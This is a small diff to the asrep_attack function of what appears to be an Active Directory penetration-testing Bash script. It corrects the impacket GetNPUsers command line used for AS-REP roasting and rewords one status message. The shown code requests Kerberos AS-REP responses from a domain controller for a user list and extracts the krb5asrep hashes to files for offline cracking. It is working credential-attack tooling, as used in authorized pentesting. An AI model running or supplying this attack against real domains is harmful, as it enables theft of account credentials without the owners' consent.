@@ -1372,7 +1372,7 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                 users_scan_list=${user_wordlist}
             fi
-            run_command "${impacket_GetNPUsers} ${dc_domain} -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"  > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"  > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
             run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
@@ -1384,7 +1384,7 @@ asrep_attack () {
         else
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' | tee ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
             if [ -s "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ] ; then
-                echo -e "${GREEN}[+] Printing ASREP-roastable accounts...${NC}"
+                echo -e "${GREEN}[+] ASREP-roastable accounts found!${NC}"
             else
                 echo -e "${PURPLE}[-] No ASREP-roastable accounts found${NC}"
             fi
